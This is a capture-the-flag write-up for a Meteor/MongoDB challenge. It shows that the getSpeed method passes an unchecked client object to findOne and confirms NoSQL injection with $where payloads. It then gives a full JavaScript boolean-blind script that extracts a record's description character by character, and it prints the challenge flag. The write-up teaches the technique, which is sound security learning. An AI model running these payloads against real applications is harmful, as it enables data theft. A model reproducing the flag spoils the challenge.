
### Tags
#NoSQLInjection #Meteor #ConsoleJS #MongoDB #CTF
### Skills 

- NoSQL Injection
- Meteor Methods
- Console JS
- $where Queries
- Boolean Blind Extraction
- MongoDB Operators


## Solution :
-> When investigating the source code we discover that the app uses a javascript framework called meteor

-> after looking in the `server` code in `main.js` we can find methods used in this challenge 
```javascript
Meteor.methods({
  getPurpose(about) {
    check(about, String);

    if (about === 'learn_more') {
      return "asteroid collection";
    }
  },
  getAsteroidNames() {
    return AsteroidCollection.find({}, { fields: { name: 1 } }).fetch();
  },
  getSize(name) {
    check(name, String);

    const asteroid = AsteroidCollection.findOne({ name });

    if (asteroid) {
      return asteroid.size;
    }
  },
  getSpeed(data, in_meters) {
    check(data, Object);
    check(in_meters, Boolean);

    const asteroid = AsteroidCollection.findOne(data);

    if (asteroid) {
      return in_meters ? asteroid.speed : asteroid.speed * 3600;
    }
  }
```

-> In meteor we can call these methods in console using `Meteor.call` as shown in the documentation here : https://guide.meteor.com/methods


-> for example :
```javascript
Meteor.call("getAsteroidNames", console.log)
```
returns the names of asteroids as shown in the code.

-> something fishy in the getSpeed method 
```js
 getSpeed(data, in_meters) {
    check(data, Object);
    check(in_meters, Boolean);

    const asteroid = AsteroidCollection.findOne(data);

    if (asteroid) {
      return in_meters ? asteroid.speed : asteroid.speed * 3600;
    }
  }
```
-> the `findOne`  allow injection of `MongoDb` queries due to no input sanitization
-> this is a NoSQL injection vulnerability because the data is an object that can be any query and can be validated due to the check on Object

#### Test
```JS
Meteor.call("getSpeed", {$where: "true"}, true, console.log)
// 17.9
Meteor.call("getSpeed", {$where: "false"}, true, console.log)
// undefined
```

-> **Reasoning:** $where: "true" selects a document (likely the first one), and getSpeed returns its speed. $where: "false" selects no documents, so findOne returns null, and getSpeed returns undefined. This behavior confirms $where can control document selection and suggests a way to test conditions on fields like description.

### exploit
```JS

const charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c";

const tryBoolean = (condition) => {
    return new Promise((resolve, reject) => {
        Meteor.call("getSpeed", {$where: condition}, true, async (err, result) => {
            return resolve(await result);
        });
    });
};

const run = async () => {
    let data = "";

    while(true) {
        let next = false;

        for (const char of charset) {
            const result = await tryBoolean(`this.name === '[[REDACTED]]' && this.description.startsWith('${data + char}')`);

            if (result !== undefined) {
                data += char;
                next = true;

                console.log(data);
                break;
            }
        }

        if (!next)
            break;
    }
}

run();
```

-> and we get the flag
BtSCTF{4st3r01ds_4r3_v3ry_c00l}
